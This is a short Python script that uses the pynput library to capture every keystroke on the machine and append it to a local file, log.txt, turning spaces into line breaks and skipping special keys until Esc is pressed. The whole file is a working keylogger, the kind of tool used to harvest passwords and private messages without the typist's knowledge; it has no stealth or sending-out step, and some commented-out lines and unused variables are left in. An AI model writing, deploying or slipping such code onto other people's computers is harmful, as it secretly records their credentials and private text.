from pynput.keyboard import Key , Listener
import os

count = 0
keys = []

def on_press(key):
    global count ,keys

    write_file(key)
        # keys = []

def write_file(key):
    with open('log.txt' , 'a+') as f:
        # for key in keys:
        key = str(key).replace("'" , "")

        if(key.find('space') > 0):
            f.write('\n')

        elif(key.find('Key') == -1):
            f.write(key)



def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


